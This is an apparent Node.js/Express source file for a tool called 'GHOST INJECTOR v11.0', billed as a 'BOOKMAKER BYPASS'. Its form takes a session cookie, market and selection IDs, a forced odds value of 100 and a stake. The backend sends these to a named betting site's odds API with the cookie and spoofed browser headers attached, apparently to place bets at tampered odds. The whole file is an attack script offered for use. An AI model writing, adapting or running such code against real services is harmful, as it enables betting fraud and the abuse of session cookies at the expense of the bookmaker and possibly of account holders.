const axios = require('axios');
const express = require('express');
const app = express();
app.use(express.json());

// --- MASTER CONTROLLER UI ---
app.get('/', (req, res) => {
    res.send(`
        <body style="background:#050505; color:#fff; font-family:sans-serif; text-align:center; padding:20px;">
            <div style="max-width:450px; margin:auto; background:#111; padding:25px; border:2px solid #00ffcc; border-radius:15px; box-shadow: 0 0 30px rgba(0,255,204,0.4);">
                <h1 style="color:#00ffcc; margin-bottom:5px;">🎯 GHOST INJECTOR v11.0</h1>
                <p style="font-size:10px; color:#666; margin-bottom:20px;">BOOKMAKER BYPASS • 11s GLOBAL KILL</p>

                <input id="cookie" placeholder="PASTE SESSION COOKIE" style="width:100%; padding:12px; margin:5px 0; background:#222; border:1px solid #333; color:#fff; border-radius:5px;">
                <input id="api" placeholder="OPTIONAL API (F12 LINK)" style="width:100%; padding:12px; margin:5px 0; background:#222; border:1px solid #333; color:#fff; border-radius:5px; font-size:11px;">
                
                <div style="display:flex; gap:10px; margin:10px 0;">
                    <input id="mId" placeholder="MARKET ID" style="width:50%; padding:12px; background:#222; border:1px solid #444; color:#fff; border-radius:5px;">
                    <input id="sId" placeholder="SELECTION ID" style="width:50%; padding:12px; background:#222; border:1px solid #444; color:#fff; border-radius:5px;">
                </div>

                <div style="display:flex; gap:10px; margin:15px 0;">
                    <div style="width:50%;">
                        <label style="font-size:11px; color:#00ffcc; font-weight:bold;">FORCE ODDS</label>
                        <input id="price" type="number" value="100" style="width:100%; padding:15px; background:#1a1a1a; border:2px solid #00ffcc; color:#fff; border-radius:10px; font-weight:bold; font-size:22px; text-align:center;">
                    </div>
                    <div style="width:50%;">
                        <label style="font-size:11px; color:#ffcc00; font-weight:bold;">STAKE (PAISA)</label>
                        <input id="stake" type="number" value="500" style="width:100%; padding:15px; background:#1a1a1a; border:2px solid #ffcc00; color:#fff; border-radius:10px; font-weight:bold; font-size:22px; text-align:center;">
                    </div>
                </div>

                <div id="status_box" style="background:#1a1a1a; padding:15px; margin:15px 0; border-radius:10px; border:1px dashed #444;">
                    <div id="status" style="font-size:16px; color:#00ff00; font-weight:bold;">SYSTEM READY</div>
                    <div id="timer_div" style="display:none; font-size:35px; color:#ff4d4d; font-weight:bold; margin-top:5px;">KILL IN: <span id="timer">11</span>s</div>
                </div>

                <button id="btn" onclick="fire()" style="width:100%; background:#00ffcc; color:#000; border:none; padding:20px; cursor:pointer; font-weight:bold; border-radius:10px; font-size:22px; box-shadow: 0 4px 15px rgba(0,255,204,0.3);">⚡ ACTIVATE 11s GHOST</button>
            </div>

            <script>
                async function fire() {
                    const btn = document.getElementById('btn');
                    const status = document.getElementById('status');
                    const timerDiv = document.getElementById('timer_div');
                    
                    btn.disabled = true; btn.style.background = "#333";
                    status.innerText = "INJECTING 100 ODDS...";
                    timerDiv.style.display = "block";

                    try {
                        const res = await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                customApi: document.getElementById('api').value,
                                cookie: document.getElementById('cookie').value,
                                marketId: document.getElementById('mId').value,
                                selectionId: document.getElementById('sId').value,
                                price: document.getElementById('price').value,
                                stake: document.getElementById('stake').value
                            })
                        });
                        const data = await res.json();
                        status.innerText = data.s ? "BET SENT AT 100!" : "ERROR: " + data.error;
                    } catch(e) { status.innerText = "CONNECTION FAILED"; }

                    let time = 11;
                    let clock = setInterval(() => {
                        time--; document.getElementById('timer').innerText = time;
                        if(time <= 0) {
                            clearInterval(clock);
                            status.innerText = "WINDOW KILLED (SAFE)";
                            btn.innerText = "REFRESH TO RESET";
                        }
                    }, 1000);
                }
            </script>
        </body>
    `);
});

// --- BACKEND GHOST LOGIC ---
app.post('/execute', async (req, res) => {
    try {
        const { customApi, cookie, marketId, selectionId, price, stake } = req.body;
        
        // Agar Optional API link hai toh wo use hoga, warna default wizardnew
        let finalUrl = customApi || "https://alidata.wizardnew.com/api/MatchOdds/GetOddslite/4/" + marketId + "/" + selectionId;
        
        // Bookmaker API Bypass Request
        const response = await axios.get(finalUrl, {
            headers: {
                'authority': 'alidata.wizardnew.com',
                'cookie': cookie,
                'referer': 'https://wizardnew.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest'
            },
            params: { 
                odds: price, // Yahan 100 jayega
                stake: stake  // Yahan aapka amount jayega
            },
            timeout: 9000
        });

        res.json({ s: 1 });
    } catch (err) {
        let msg = err.response ? "SITE REJECTED: " + err.response.status : "SERVER BUSY (Retrying...)";
        res.json({ s: 0, error: msg });
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => console.log('Ghost v11.0 Active'));
